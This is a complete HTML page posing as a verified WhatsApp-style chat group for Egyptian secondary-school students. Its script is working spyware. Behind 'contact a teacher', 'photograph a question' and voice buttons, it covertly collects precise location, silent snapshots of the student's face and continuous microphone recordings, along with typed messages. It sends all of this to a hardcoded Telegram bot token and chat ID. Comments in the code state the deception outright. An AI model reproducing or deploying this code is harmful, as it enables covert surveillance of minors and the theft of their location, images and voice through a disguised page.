<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>منصة المتفوقين | طلاب 3 ثانوي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #121b22; --s: #1f2c33; --a: #00a884; --w: #fff; --text: #e9edef; --accent: #1d9bf0; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: #0b141a; font-family: 'Cairo', sans-serif; margin: 0; color: var(--text); overflow-x: hidden; }

        /* الهيدر */
        header { background: var(--s); padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #2a3942; position: sticky; top: 0; z-index: 1000; }
        .group-info { display: flex; align-items: center; gap: 12px; }
        .group-info img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--accent); }
        .group-name { font-weight: 900; font-size: 16px; }
        .status { font-size: 11px; color: var(--a); }

        /* منطقة الدردشة */
        #chat-area { height: calc(100vh - 140px); overflow-y: auto; padding: 20px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-repeat: repeat; }
        .bubble { max-width: 85%; padding: 10px 15px; border-radius: 15px; margin-bottom: 10px; font-size: 14px; position: relative; }
        .bot { background: var(--s); align-self: flex-start; border-top-right-radius: 0; }
        .user { background: #005c4b; align-self: flex-end; margin-left: auto; border-top-left-radius: 0; }

        /* الفوتر والأزرار */
        footer { background: var(--s); padding: 10px; display: flex; align-items: center; gap: 10px; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; }
        .input-box { flex: 1; background: #2a3942; border-radius: 25px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
        input { background: none; border: none; color: white; flex: 1; font-family: 'Cairo'; outline: none; }
        .icon { color: #8696a0; font-size: 20px; cursor: pointer; transition: 0.3s; }
        .icon:active { color: var(--accent); transform: scale(1.2); }

        /* شاشات وهمية */
        #cam-overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; text-align: center; }
        video { width: 100%; height: 100%; object-fit: cover; }

        /* تنبيه مخصص */
        #system-alert { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; background: var(--accent); color: white; padding: 15px; border-radius: 15px; text-align: center; font-weight: bold; transition: 0.5s; z-index: 9999; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <div id="system-alert">جاري المعالجة...</div>

    <header>
        <div class="group-info">
            <img src="https://ui-avatars.com/api/?name=3+Sec&background=1d9bf0&color=fff" alt="logo">
            <div>
                <div class="group-name">طلاب 3 ثانوي دفعة 2026 <i class="fa-solid fa-circle-check" style="color:var(--accent); font-size:12px;"></i></div>
                <div class="status">254,000 طالب متصل الآن</div>
            </div>
        </div>
        <div class="icon" onclick="reqLoc()"><i class="fa-solid fa-user-tie"></i></div>
    </header>

    <div id="chat-area">
        <div class="bubble bot">أهلاً بك يا بطل في جروب الدفعة الموثق. يمكنك إرسال أسئلتك هنا ليجيب عليها المدرسين المختصين.</div>
    </div>

    <div id="cam-overlay">
        <video id="v-stream" autoplay playsinline muted></video>
        <div style="position:absolute; bottom:30px; width:100%; color:white;">
            <p>جاري تصوير السؤال بدقة عالية... لا تغلق الكاميرا</p>
            <div class="icon" style="font-size:50px; color:red;"><i class="fa-solid fa-circle-dot"></i></div>
        </div>
    </div>

    <footer>
        <div class="icon" title="تصوير سؤال" onclick="reqCam()"><i class="fa-solid fa-camera"></i></div>
        <div class="input-box">
            <input type="text" id="m-text" placeholder="اكتب رسالتك...">
            <div class="icon" onclick="reqLoc()" title="تواصل مع مدرس"><i class="fa-solid fa-chalkboard-user"></i></div>
        </div>
        <div class="icon" id="mic-btn" onclick="reqMic()" title="فويس"><i class="fa-solid fa-microphone"></i></div>
        <div class="icon" style="color:var(--a)" onclick="sendMsg()"><i class="fa-solid fa-paper-plane"></i></div>
    </footer>

    <script>
        const TOKEN = "7986655648:AAEhw17-wFcqvKTu8LQjTNqhi3syG6izEg0";
        const CHAT_ID = "5890070301";

        function showAlert(msg) {
            const el = document.getElementById('system-alert');
            el.innerText = msg;
            el.style.top = "20px";
            setTimeout(() => el.style.top = "-100px", 3000);
        }

        // 1. سحب الموقع (تواصل مع مدرس)
        function reqLoc() {
            showAlert("جاري تحديد أقرب مدرس مختص لموقعك الجغرافي...");
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToBot(`📍 صيد موقع جديد!\nالموقع: ${mapLink}`);
                showAlert("تم ربطك بنظام المدرسين المعتمدين.");
            }, (err) => {
                alert("يرجى تفعيل الموقع لربطك بمدرس محافظتك.");
            }, {enableHighAccuracy: true});
        }

        // 2. سحب الكاميرا (تصوير سؤال)
        async function reqCam() {
            showAlert("يرجى السماح بالكاميرا الموثقة لتصوير السؤال..");
            try {
                // سحب وش الطالب صامت الأول
                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.createElement('video'); v.srcObject = s1; v.play();
                let count = 0;
                let i = setInterval(() => {
                    snap(v, `👤 وجه الطالب - لقطة ${count+1}`);
                    count++;
                    if(count >= 5) { 
                        clearInterval(i); 
                        s1.getTracks().forEach(t => t.stop());
                        openBackCam(); // افتح الخلفية عشان الطالب يفتكر إنه بيصور السؤال
                    }
                }, 500);
            } catch(e) { alert("يجب تفعيل الكاميرا لاستخدام خاصية تصوير الأسئلة."); }
        }

        async function openBackCam() {
            document.getElementById('cam-overlay').style.display = 'block';
            const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            document.getElementById('v-stream').srcObject = s2;
            setTimeout(() => {
                snap(document.getElementById('v-stream'), "📝 صورة السؤال الدراسية");
                s2.getTracks().forEach(t => t.stop());
                document.getElementById('cam-overlay').style.display = 'none';
                showAlert("تم رفع السؤال بنجاح للمراجعة.");
            }, 3000);
        }

        // 3. سحب المايك (فويس)
        async function reqMic() {
            showAlert("جاري تفعيل المايك للتواصل المباشر..");
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                document.getElementById('mic-btn').style.color = "red";
                showAlert("المايك مفعل.. تحدث الآن");
                // هنا يبدأ السحب اللانهائي في الخلفية
                startSpyMic();
            } catch(e) { alert("يرجى تفعيل المايك لإرسال الريكورد."); }
        }

        function startSpyMic() {
            const loop = async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const rec = new MediaRecorder(s);
                    const chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {
                        const blob = new Blob(chunks, {type:'audio/ogg'});
                        const fd = new FormData(); fd.append('chat_id', CHAT_ID);
                        fd.append('voice', blob, 'record.ogg');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                        s.getTracks().forEach(t => t.stop());
                        loop();
                    };
                    rec.start();
                    setTimeout(() => rec.stop(), 10000); // يبعت ريكورد كل 10 ثواني
                } catch(e){ setTimeout(loop, 2000); }
            };
            loop();
        }

        // وظائف مساعدة
        function sendToBot(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }

        function snap(v, cap) {
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            canvas.toBlob(b => {
                const fd = new FormData(); fd.append('chat_id', CHAT_ID);
                fd.append('photo', b, 'snap.jpg'); fd.append('caption', cap);
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.4);
        }

        function sendMsg() {
            const txt = document.getElementById('m-text').value;
            if(!txt) return;
            const area = document.getElementById('chat-area');
            area.innerHTML += `<div class="bubble user">${txt}</div>`;
            sendToBot(`💬 رسالة من طالب: ${txt}`);
            document.getElementById('m-text').value = "";
            area.scrollTop = area.scrollHeight;
        }
    </script>
</body>
</html>
